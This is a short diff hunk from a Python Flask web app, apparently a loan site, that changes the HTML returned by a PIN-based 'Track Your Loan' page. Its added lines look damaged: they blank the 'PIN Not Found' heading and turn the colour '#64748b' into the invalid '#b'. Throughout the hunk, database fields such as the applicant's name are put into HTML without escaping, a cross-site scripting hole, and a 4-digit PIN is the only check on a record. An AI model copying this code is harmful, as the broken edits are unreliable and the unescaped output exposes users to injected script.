@@ -114,8 +114,8 @@ def track():
             pass
         if found:
             return H + '<div class=wrap><div class=card><h1>Loan Found ✅</h1><p style="text-align:center">Ref: <b>'+found[8]+'</b><br>Name: <b>'+found[1]+'</b><br>Loan: <b>'+found[4]+'</b><br>Status: <b>⏳ Under Review - We will WhatsApp you</b></p><a class=btn href='+W+'>WHATSAPP US</a></div></div>'
-        return H + '<div class=wrap><div class=card><h1>PIN Not Found ❌</h1><p style="text-align:center">Check your PIN and try again.</p><a class=btn href=/track>TRY AGAIN</a></div></div>'
-    return H + '<div class=wrap><div class=card><h1>🔍 Track Your Loan</h1><p style="text-align:center;color:#64748b">Enter your 4-digit   </p><form method=POST><input name=pin required placeholder="Enter 4-digit PIN" maxlength=4 style="text-align:center;font-size:30px;letter-spacing:6px"><br><br><button class=btn>CHECK STATUS →</button></form></div></div>'
+        return H + '<div class=wrap><div class=card><h1></h1><p style="text-align:center">Check your PIN and try again.</p><a class=btn href=/track>TRY AGAIN</a></div></div>'
+    return H + '<div class=wrap><div class=card><h1>🔍 Track Your Loan</h1><p style="text-align:center;color:#b">Enter your 4-digit   </p><form method=POST><input name=pin required placeholder="Enter 4-digit PIN" maxlength=4 style="text-align:center;font-size:30px;letter-spacing:6px"><br><br><button class=btn>CHECK STATUS →</button></form></div></div>'
 
 @app.route('/test-telegram')
 def test():
